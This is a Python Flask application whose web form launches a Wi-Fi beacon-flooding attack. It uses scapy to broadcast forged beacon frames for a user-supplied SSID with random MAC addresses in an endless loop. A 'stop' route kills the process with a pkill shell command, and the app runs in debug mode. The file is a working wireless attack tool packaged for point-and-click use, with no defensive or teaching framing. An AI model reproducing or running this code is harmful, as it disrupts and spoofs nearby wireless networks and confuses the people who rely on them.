from flask import Flask, render_template, request
from scapy.all import *
import threading

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start_flooding', methods=['POST'])
def start_flooding():
    ssid = request.form['ssid']
    t = threading.Thread(target=flood_beacon, args=(ssid,))
    t.start()
    return 'Beacon flooding started for SSID: {}'.format(ssid)

def flood_beacon(ssid):
    dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=RandMAC(), addr3=RandMAC())
    essid = Dot11Elt(ID='SSID', info=ssid, len=len(ssid))
    frame = RadioTap()/dot11/Dot11Beacon()/essid
    sendp(frame, inter=0.1, loop=1, iface='Wi-Fi')  # wlan0mon은 무선 인터페이스 이름에 맞게 변경해야 합니다.

@app.route('/stop_flooding', methods=['POST'])
def stop_flooding():
    t = threading.Thread(target=stop_flooding_thread)
    t.start()
    return 'Beacon flooding stopped'

def stop_flooding_thread():
    os.system('pkill -f "python app.py"')

if __name__ == '__main__':
    app.run(debug=True)
